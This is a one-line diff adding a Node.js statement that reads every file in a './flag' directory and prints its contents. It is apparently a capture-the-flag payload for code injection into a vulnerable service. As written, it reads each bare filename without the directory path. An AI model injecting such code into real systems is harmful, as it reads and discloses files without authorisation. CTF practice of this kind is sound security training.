@@ -1,0 +1,1 @@
+require('fs').readdirSync('./flag').forEach(filename => console.log(require('fs').readFileSync(filename)));
